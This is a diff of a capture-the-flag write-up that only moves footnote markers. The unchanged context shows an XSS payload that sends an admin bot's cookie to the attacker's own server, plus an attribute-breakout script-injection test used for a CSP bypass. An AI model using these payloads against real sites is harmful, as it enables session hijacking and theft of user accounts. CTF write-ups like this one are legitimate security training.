@@ -84,13 +84,14 @@ And it does work! Now with our foothold, what can we do with it?
 ## Exploitation
 During our enumeration, we understand that'll be a bot the crawls through the blog site itself. Hence our objective is to use XSS to steal the "cookie" of the admin which will hold our flag. I made a simple XSS payload that'll force the website to send their user cookie to my server as shown below;
 
-- Payload [^1]
+- Payload
 ```javascript
 <script>
 document.write('<img src="http://127.0.0.1:8000/?'+document.cookie+'"/>');
 </script> 
 //Note that the ip address should be your ip address that you want to take the cookies
 ```
+[^1]
 
 
 - On Our machine (to receive the cookies)
@@ -114,7 +115,8 @@ Hence with the mindset of "hey they probably misconfigured something", we can se
 
 ```javascript
 "/><script>console.log("bypass works");</script>
-```[^4]
+```
+[^4]
 
 
 ![CSP Bypass Works](img/bypasstestWorks.PNG)
